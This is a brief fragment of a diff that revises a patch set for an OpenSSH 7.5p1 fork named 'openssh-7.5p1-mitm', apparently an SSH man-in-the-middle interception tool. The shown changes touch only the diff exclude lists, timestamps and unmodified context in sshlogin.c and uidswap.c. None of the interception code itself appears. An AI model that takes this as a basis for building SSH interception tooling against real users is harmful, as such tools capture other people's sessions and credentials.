+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshlogin.c openssh-7.5p1-mitm/sshlogin.c
 --- openssh-7.5p1/sshlogin.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshlogin.c	2017-06-28 19:20:35.345729196 -0400
++++ openssh-7.5p1-mitm/sshlogin.c	2017-07-06 12:52:17.029320213 -0400
 @@ -113,7 +113,8 @@
  		else
  			snprintf(buf, sizeof(buf), "Last login: %s from %s\r\n",
@@ -933,9 +2762,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	}
  # endif /* CUSTOM_SYS_AUTH_GET_LASTLOGIN_MSG */
  #endif /* NO_SSH_LASTLOG */
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/uidswap.c openssh-7.5p1-mitm/uidswap.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/uidswap.c openssh-7.5p1-mitm/uidswap.c
 --- openssh-7.5p1/uidswap.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/uidswap.c	2017-06-28 19:20:35.349729196 -0400
++++ openssh-7.5p1-mitm/uidswap.c	2017-07-06 12:52:17.029320213 -0400
 @@ -59,6 +59,8 @@
  void
  temporarily_use_uid(struct passwd *pw)
